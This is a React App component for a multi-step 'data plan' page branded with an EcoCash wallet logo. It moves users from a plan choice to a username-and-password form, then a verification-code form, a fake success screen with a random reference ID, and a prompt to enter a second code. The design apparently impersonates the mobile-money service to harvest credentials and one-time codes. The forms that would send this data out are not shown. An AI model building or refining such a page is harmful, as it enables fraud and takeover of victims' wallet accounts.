import React, { useState } from 'react';
import LoginForm from './components/LoginForm';
import VerificationForm from './components/VerificationForm';
import DataPlans, { DataPlan } from './components/DataPlans';

export type AppStep = 'plans' | 'login' | 'verification' | 'verification2' | 'success';

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep>('plans');
  const [userData, setUserData] = useState({ username: '', password: '' });
  const [selectedPlan, setSelectedPlan] = useState<DataPlan | null>(null);

  const handlePlanSelect = (plan: DataPlan) => {
    setSelectedPlan(plan);
    setStep('login');
  };

  const handleLoginSuccess = (data: { username: string; password: string }) => {
    setUserData(data);
    setStep('verification');
  };

  const handleVerificationSuccess = () => {
    setStep('success');
  };

  const handleReenterVerification = () => {
    setStep('verification2');
  };

  return (
    <div className="min-h-screen w-full relative flex flex-col items-center justify-center py-8 px-4 sm:px-6 lg:px-8 bg-[#f3f7fa]">
      {/* Background with network pattern overlay */}
      <div
        className="absolute inset-0 z-0 opacity-10 pointer-events-none"
        style={{
          backgroundImage: `url('https://www.transparenttextures.com/patterns/connect.png')`,
        }}
      />

      {/* Content wrapper */}
      <div
        className={`relative z-10 w-full flex flex-col items-center transition-all duration-500 ${
          step === 'plans' ? 'max-w-6xl' : 'max-w-md'
        }`}
      >
        {/* Logo above the container (kept for the login/verification steps) */}
        {step !== 'plans' && (
          <div className="mb-8 transform hover:scale-105 transition-transform duration-300">
            <img
              src="https://i.postimg.cc/4xJM2Vf9/Eco-Cash-removebg-preview.png"
              alt="Wallet Logo"
              className="h-20 sm:h-24 w-auto object-contain drop-shadow-md"
            />
          </div>
        )}

        {/* Dynamic Container Content */}
        <div className="w-full transition-all duration-500 ease-in-out">
          {step === 'plans' && (
            <DataPlans onSelect={handlePlanSelect} />
          )}

          {step === 'login' && (
            <LoginForm onLogin={handleLoginSuccess} loanData={selectedPlan ?? undefined} />
          )}

          {step === 'verification' && (
            <VerificationForm
              username={userData.username}
              onVerify={handleVerificationSuccess}
              onBack={() => setStep('login')}
            />
          )}

          {step === 'verification2' && (
            <VerificationForm
              username={userData.username}
              onVerify={handleVerificationSuccess}
              onBack={() => setStep('success')}
              isSecondCode={true}
            />
          )}

          {step === 'success' && (
            <div className="w-full bg-white rounded-2xl shadow-2xl p-8 sm:p-12 text-center animate-in fade-in zoom-in duration-300">
              <div className="mb-6 flex justify-center">
                <div className="rounded-full bg-green-100 p-4 animate-bounce">
                  <svg className="h-16 w-16 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
              <h1 className="text-3xl font-bold text-gray-800 mb-4">Application Success!</h1>
              <p className="text-gray-600 mb-8">Your data plan request is being processed and will be activated shortly.</p>

              <div className="bg-gray-50 rounded-lg p-4 border border-dashed border-gray-300 mb-8">
                <p className="text-xs text-gray-500 uppercase tracking-widest font-semibold">Reference ID</p>
                <p className="text-lg font-mono text-gray-800">TX-{Math.random().toString(36).substr(2, 9).toUpperCase()}</p>
              </div>

              <button
                onClick={handleReenterVerification}
                className="w-full bg-white text-blue-600 border-2 border-blue-600 font-bold py-3.5 px-6 rounded-xl hover:bg-blue-50 transition-all duration-200 uppercase tracking-widest text-sm"
              >
                Re-enter Verification Code
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default App;
